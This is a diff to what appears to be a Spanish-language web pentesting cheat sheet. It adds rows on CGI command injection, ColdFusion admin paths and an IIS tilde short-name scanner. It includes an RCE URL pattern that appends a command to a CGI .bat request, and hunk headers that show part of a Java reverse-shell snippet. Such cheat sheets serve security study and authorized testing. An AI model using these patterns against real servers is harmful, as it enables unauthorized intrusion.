@@ -99,6 +99,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 | Herramienta | Uso |
 | --- |:-----:|
 | **Directorios** | `/cgi`  \| `/cgi-bin` |
+| **RCE** | `http://[Dominio]/cgi/[archivo].bat?&[Command]` |
 | **Extensiones de Archivos** | `.pl`-`.cgi`-`.pl`-`.bat`-`.cmd`-`.sh` |
 | **ShellShock** | `https://blog.cloudflare.com/inside-shellshock/` |
 
@@ -108,3 +109,16 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 | --- |:-----:|
 | **Herramientas** | [CFF Explorer](https://ntcore.com/?page_id=388)  \| [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) \| [Strings](https://learn.microsoft.com/en-us/sysinternals/downloads/strings) \| [dnSpy](https://github.com/dnSpy/dnSpy) |
 
+## ColdFusion 🍧🔥
+
+| Herramienta | Uso |
+| --- |:-----:|
+| **Extensiones de Archivo** | `.cmf`  \| `.cfc` |
+| **Directorios** | `/admin.cmf`  \| `/CFIDE/administrator/index.cfm` |
+
+
+## IIS Tilde Enumeration 🔢
+| Herramienta | Uso |
+| --- |:-----:|
+| **IIS ShortName** | `https://github.com/irsdl/IIS-ShortName-Scanner` |
+| **Uso** | `java -jar iis_shortname_scanner.jar 0 5 http://[Dominio]/` |
